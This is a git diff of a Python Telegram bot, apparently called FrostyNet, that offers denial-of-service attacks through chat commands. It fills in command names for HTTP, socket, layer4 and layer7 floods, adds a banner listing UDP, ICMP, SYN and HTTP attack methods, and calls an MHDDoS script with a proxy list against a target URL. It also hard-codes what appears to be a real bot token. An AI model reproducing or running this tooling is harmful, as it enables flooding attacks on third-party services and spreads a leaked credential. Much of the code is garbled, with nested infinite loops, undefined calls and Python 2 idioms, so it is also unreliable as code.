@@ -8,29 +8,28 @@ import requests,json
 import socket
 import ipaddress
 import nmap
-TOKEN = 'Token bot'
-BOTNAME = '@(put ur botame here)'
+TOKEN = '6709820541:AAHxFU-2PBvrkaGR1kmF_Ch8_QEgnXkxaXs'
+BOTNAME = '@FrostyNet_bot'
 s = '360'
 url='https://api.telegram.org/bot'+TOKEN+"/SetMyCommands?commands="
-#rename the commands if u want to in the code not only in the cmd part but other parts
 cmd=[{
-     "command":"any command u want to put for this ig",
-     "description":"dsecription for shutdown"
+     "command":"sublime",
+     "description":"dsecription for bbosing"
 },
 {
-  "command":"any command u want to put for this ig",
+  "command":"http_stresser2",
   "description":"description for http method"   
 },
 {
-     "command":"any command u want to put for this ig",
+     "command":"socket1",
      "description":"description for socket method"
 },
 {
-     "command":"any command u want to put for this ig",
+     "command":"layer4",
      "description":"layer4 method"
 },
 {
-  "command":"any command u want to put for this ig",
+  "command":"layer7",
   "description":"layer7 method"     
 }
 cmd=json.dumps(cmd)
@@ -43,10 +42,20 @@ def sublime(update: Updater,CallbackContext ,context):
     telegram = telegram_engine(TOKEN,show_log=True,send_system_data=True)
     delay = 10
     bruh = subprocess.call(f'python3 ~/MDHDOS/telegram.py GET {url} 1 400 mhddos_proxy/list 1000 {s}', stdout=subprocess.PIPE, shell=True)
+    method = """\033[91m
++------------------------------------------------------+
+¦                     \033[00mDDoS METHODS\033[91m                     ¦               
+¦------------------------------------------------------¦
+¦ \033[00mUDP  <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m|\033[00m UDP ATTACK\033[91m    ¦
+¦ \033[00mICMP <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m|\033[00m ICMP ATTACK\033[91m   ¦
+¦ \033[00mSYN  <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m|\033[00m SYN ATTACK\033[91m    ¦
+¦ \033[00mHTTP  <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m|\033[00m HTTP ATTACK\033[91m   ¦
++------------------------------------------------------+\033[00m
+"""
     while True:
       print('*--*'*15)
       if url == True:
-            for i in payload(target=payload):
+            for i in payload(target=method):
                   print(bruh)
                   time = threading.Thread(target=sublime, args=(5000), kwargs={}, daemon=True)
                   time.start()
@@ -56,6 +65,7 @@ def sublime(update: Updater,CallbackContext ,context):
                   if __name__ == '__main__':
                        sublime()
                        bruh()
+                       method()
 
 
                        def http_stresser2(CallbackContext,context):
@@ -76,8 +86,8 @@ def sublime(update: Updater,CallbackContext ,context):
 
                                            def socket1():
                                                while True:
-                                                  url2 = Updater.message.text.replace('/socket1', '')
-                                                  Updater.dispatcher.add_handler(CommandHandler('socket1', socket1))
+                                                  url2 = Updater.message.text.replace('/http_stresser2', '')
+                                                  Updater.dispatcher.add_handler(CommandHandler('http_stresser2', http_stresser2))
                                                   Updater.start_polling()
                                                   Updater.idle()
                                                   PACKETDATA = 'f1a525da11f6'.decode('hex')
